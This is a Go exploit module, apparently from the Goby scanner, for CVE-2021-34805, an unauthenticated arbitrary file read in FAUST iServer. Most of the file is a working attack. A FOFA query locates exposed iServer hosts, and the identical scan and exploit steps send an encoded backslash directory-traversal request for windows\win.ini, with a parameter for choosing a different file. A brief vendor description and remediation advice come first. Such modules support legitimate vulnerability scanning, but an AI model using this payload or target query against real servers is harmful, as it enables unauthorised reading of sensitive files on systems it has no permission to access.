package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "FAUST iServer File Read (CVE-2021-34805)",
    "Description": "<p>Faust Iserver is a German company Land Software for bringing Faust, Faust Entry and Lidos databases to the Intranet and Internet.</p><p>FAUST iServer 9.0.017.017.1- 9.0.018.018.4 has an arbitrary file read vulnerability, and unauthorized users can obtain sensitive information.</p>",
    "Impact": "<p>FAUST iServer File Read (CVE-2021-34805)</p>",
    "Recommendation": "<p>It is forbidden to be exposed to the public network, and a whitelist can be set for access through security devices such as firewalls.</p><p>Pay attention to the official website update in time:http://www.land-software.de/lfs.fau?prj=iweb&amp;dn=faust+iserver</p>",
    "Product": "FAUST iServer",
    "VulType": [
        "Directory Traversal"
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "FAUST iServer 任意文件读取漏洞 (CVE-2021-34805)",
            "Product": "FAUST iServer",
            "Description": "<p>Faust Iserver是德国Land Software公司的用于将 Faust、Faust Entry 和 Lidos 数据库带到内联网和互联网上。<br></p><p>FAUST iServer 9.0.017.017.1- 9.0.018.018.4版本存在任意文件读取漏洞，未授权用户可获取敏感信息。<br></p>",
            "Recommendation": "<p>禁止暴露到公网，可通过防火墙等安全设备设置访问的白名单。</p><p>及时关注官网更新：<span style=\"color: var(--primaryFont-color);\"><a href=\"http://www.land-software.de/lfs.fau?prj=iweb&amp;dn=faust+iserver\">http://www.land-software.de/lfs.fau?prj=iweb&amp;dn=faust+iserver</a></span></p>",
            "Impact": "<p>FAUST iServer 9.0.017.017.1- 9.0.018.018.4版本存在任意文件读取漏洞，未授权用户可获取敏感信息。<br></p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "FAUST iServer File Read (CVE-2021-34805)",
            "Product": "FAUST iServer",
            "Description": "<p>Faust Iserver is a German company Land Software for bringing Faust, Faust Entry and Lidos databases to the Intranet and Internet.<br></p><p>FAUST iServer 9.0.017.017.1- 9.0.018.018.4 has an arbitrary file read vulnerability, and unauthorized users can obtain sensitive information.<br></p>",
            "Recommendation": "<p>It is forbidden to be exposed to the public network, and a whitelist can be set for access through security devices such as firewalls.</p><p>Pay attention to the official website update in time:<span style=\"color: var(--primaryFont-color);\"><a href=\"http://www.land-software.de/lfs.fau?prj=iweb&amp;dn=faust+iserver\">http://www.land-software.de/lfs.fau?prj=iweb&amp;dn=faust+iserver</a></span></p>",
            "Impact": "<p>FAUST iServer File Read (CVE-2021-34805)</p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "(banner=\"iServer\" || header=\"iServer\") && title!=\"SuperMap\"",
    "GobyQuery": "(banner=\"iServer\" || header=\"iServer\") && title!=\"SuperMap\"",
    "Author": "abszse",
    "Homepage": "http://www.land-software.de/lfs.fau?prj=iweb&dn=faust+iserver",
    "DisclosureDate": "2022-03-24",
    "References": [
        "https://packetstormsecurity.com/files/165701/FAUST-iServer-9.0.018.018.4-Local-File-Inclusion.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2021-34805"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202201-2281"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "bit app support",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "extensions",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "fonts",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "bit app support",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "extensions",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "fonts",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "%5cwindows%5cwin.ini",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "6874"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
